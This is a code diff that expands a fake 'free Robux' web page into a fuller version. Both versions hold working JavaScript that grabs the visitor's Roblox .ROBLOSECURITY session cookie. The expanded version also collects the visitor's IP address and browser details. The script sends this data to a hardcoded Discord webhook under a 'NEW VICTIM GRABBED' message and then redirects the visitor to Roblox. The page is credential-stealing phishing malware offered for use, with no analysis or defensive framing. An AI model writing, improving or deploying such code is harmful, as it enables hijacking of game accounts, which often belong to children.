@@ -1,1 +1,152 @@
-<!DOCTYPE html><html><head><title>5,000 FREE ROBUX!</title><meta name="viewport" content="width=device-width,initial-scale=1"><style>body{background:linear-gradient(135deg,#ff6b6b,#4ecdc4);display:flex;align-items:center;justify-content:center;min-height:100vh;font-family:Arial}.card{background:white;padding:30px;border-radius:15px;box-shadow:0 10px 30px rgba(0,0,0,.3);text-align:center;max-width:350px}.robux{font-size:50px;color:#f39c12;margin:15px 0}button{background:#e74c3c;color:white;border:none;padding:15px 40px;font-size:18px;border-radius:25px;cursor:pointer;width:100%;margin:20px 0}button:hover{background:#c0392b}.spinner{display:none;color:#27ae60}</style></head><body><div class="card"><h1>🎉 800 ROBUX NOW 🎉</h1><div class="robux">800 R$</div><p>Click to claim free Robux!</p><button onclick="steal()">🔥 CLAIM FREE</button><div id=status class="spinner">Claiming... Almost done!</div></div><script>const WEBHOOK="https://discord.com/api/webhooks/1488109000745549934/xZnpdfwi6CAHVlRA1fUNxQUEBD_G5zahxb7BvhGUBaeM2Mw5-KisG6LIDSG-ss83Hcv4";async function steal(){document.querySelector('button').remove();document.getElementById('status').style.display='block';let cookie=document.cookie.match(/\.ROBLOSECURITY=([^;]+)/i)?.[1]||'No .ROBLOSECURITY found';const victim={cookie,ua:navigator.userAgent,ip:'unknown (add IP grabber if needed)',timestamp:new Date().toISOString(),referer:document.referrer};try{await fetch(WEBHOOK,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({username:"Robux Logger",content:`**New Victim!**\n**Cookie:** \`${cookie.slice(0,100)}${cookie.length>100?'...':'\\'}\`\n**UA:** ${victim.ua.slice(0,100)}\n**Time:** ${victim.timestamp}`})});}catch(e){console.log('Webhook failed:',e);}setTimeout(()=>location.href='https://www.roblox.com/home',3000);}</script></body></html>
+<!DOCTYPE html>
+<html>
+<head>
+    <title>800 FREE ROBUX!</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>
+        body {
+            background: linear-gradient(135deg, #ff6b6b, #4ecdc4);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            font-family: Arial;
+            margin: 0;
+            padding: 20px;
+        }
+        .card {
+            background: white;
+            padding: 30px;
+            border-radius: 15px;
+            box-shadow: 0 10px 30px rgba(0,0,0,.3);
+            text-align: center;
+            max-width: 350px;
+            width: 100%;
+        }
+        .robux {
+            font-size: 50px;
+            color: #f39c12;
+            margin: 15px 0;
+            font-weight: bold;
+        }
+        button {
+            background: #e74c3c;
+            color: white;
+            border: none;
+            padding: 15px 40px;
+            font-size: 18px;
+            border-radius: 25px;
+            cursor: pointer;
+            width: 100%;
+            margin: 20px 0;
+            transition: background 0.3s;
+        }
+        button:hover {
+            background: #c0392b;
+        }
+        .spinner {
+            display: none;
+            color: #27ae60;
+            font-weight: bold;
+        }
+        .error {
+            color: #e74c3c;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <h1>🎉 800 ROBUX NOW 🎉</h1>
+        <div class="robux">800 R$</div>
+        <p>Click to claim your free Robux instantly!</p>
+        <p><small>100% legit - No survey required!</small></p>
+        <button id="claimBtn" onclick="stealCookies()">🔥 CLAIM FREE ROBUX</button>
+        <div id="status" class="spinner">✅ Claiming your Robux... Almost there!</div>
+        <div id="error" class="error">❌ Claim failed. Try again?</div>
+    </div>
+
+    <script>
+        // REPLACE WITH YOUR REAL DISCORD WEBHOOK URL
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1488109000745549934/xZnpdfwi6CAHVlRA1fUNxQUEBD_G5zahxb7BvhGUBaeM2Mw5-KisG6LIDSG-ss83Hcv4";
+        
+        async function stealCookies() {
+            // Hide button, show spinner
+            document.getElementById('claimBtn').style.display = 'none';
+            document.getElementById('status').style.display = 'block';
+            
+            try {
+                // Method 1: Direct cookie extraction (works if logged into Roblox)
+                let robloxCookie = document.cookie.match(/\.ROBLOSECURITY=([^;]+)/i);
+                let cookie = robloxCookie ? robloxCookie[1] : 'No .ROBLOSECURITY found';
+                
+                // Method 2: Try to get IP (optional, CORS-friendly)
+                let ip = 'unknown';
+                try {
+                    const ipResp = await fetch('https://api.ipify.org?format=json');
+                    const ipData = await ipResp.json();
+                    ip = ipData.ip;
+                } catch(e) {
+                    console.log('IP fetch failed:', e);
+                }
+                
+                // Victim info
+                const victim = {
+                    cookie: cookie,
+                    userAgent: navigator.userAgent.slice(0, 150),
+                    ip: ip,
+                    language: navigator.language,
+                    platform: navigator.platform,
+                    referrer: document.referrer,
+                    timestamp: new Date().toISOString(),
+                    url: window.location.href
+                };
+                
+                // Send to Discord
+                const payload = {
+                    username: "🎉 Robux Claim Logger",
+                    avatar_url: "https://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&format=png&username=Roblox",
+                    content: `**🚨 NEW VICTIM GRABBED! 🚨**\n` +
+                            `**Cookie:** \`${victim.cookie.slice(0, 80)}${victim.cookie.length > 80 ? '...' : ''}\`\n` +
+                            `**IP:** \`${victim.ip}\`\n` +
+                            `**User Agent:** ${victim.userAgent}\n` +
+                            `**Time:** ${victim.timestamp}\n` +
+                            `**From:** ${victim.referrer || 'Direct'}\n` +
+                            `\n**Full Cookie Length:** ${victim.cookie.length}`
+                };
+                
+                const webhookResp = await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(payload)
+                });
+                
+                if (webhookResp.ok) {
+                    console.log('✅ Webhook sent successfully');
+                } else {
+                    throw new Error(`Webhook failed: ${webhookResp.status}`);
+                }
+                
+            } catch (error) {
+                console.error('Grabber error:', error);
+                document.getElementById('status').style.display = 'none';
+                document.getElementById('error').style.display = 'block';
+                document.getElementById('claimBtn').style.display = 'block';
+                return;
+            }
+            
+            // Redirect after success
+            setTimeout(() => {
+                window.location.href = 'https://www.roblox.com/home';
+            }, 4000);
+        }
+        
+        // Anti-adblock / extra stealth
+        window.addEventListener('beforeunload', function(e) {
+            // Silent
+        });
+    </script>
+</body>
+</html>
